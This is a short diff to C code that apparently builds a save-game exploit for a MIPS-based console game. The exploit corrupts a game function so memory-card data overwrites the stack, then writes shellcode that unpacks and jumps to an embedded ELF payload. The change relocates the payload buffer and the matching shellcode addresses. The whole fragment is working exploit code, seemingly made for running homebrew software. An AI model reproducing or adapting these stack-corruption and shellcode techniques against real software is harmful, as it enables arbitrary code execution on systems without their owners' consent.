@@ -154,7 +154,7 @@ void mutate_save_game(SaveSlot* save, Buffer elf, Addresses* addresses)
 	
 	// Convert the payload data into the format the game expects, and put it in
 	// the largest block that will be loaded into memory.
-	uint32_t payload_entry = convert_elf(help_data_messages->data, help_data_messages->size, elf);
+	uint32_t payload_entry = convert_elf(help_log->data + 2 * sizeof(StackFixup), help_data_messages->size - 2 * sizeof(StackFixup), elf);
 	
 	// Corrupt the GetGadgetEvent function so it writes data from the memory
 	// card over the stack.
@@ -212,8 +212,8 @@ void mutate_save_game(SaveSlot* save, Buffer elf, Addresses* addresses)
 	uint32_t* shellcode = (uint32_t*) help_data_gadgets->data;
 	
 	// Unpack the payload and jump to it.
-	*shellcode++ = MIPS_LUI(MIPS_A0, addresses->HelpDataMessages >> 16);
-	*shellcode++ = MIPS_ORI(MIPS_A0, MIPS_A0, addresses->HelpDataMessages);
+	*shellcode++ = MIPS_LUI(MIPS_A0, (addresses->HelpLog + 2 * sizeof(StackFixup)) >> 16);
+	*shellcode++ = MIPS_ORI(MIPS_A0, MIPS_A0, addresses->HelpLog + 2 * sizeof(StackFixup));
 	*shellcode++ = MIPS_LUI(MIPS_A1, 0xffff);
 	*shellcode++ = MIPS_ORI(MIPS_A1, MIPS_A1, 0xffff);
 	*shellcode++ = MIPS_JAL(addresses->unpackbuff);
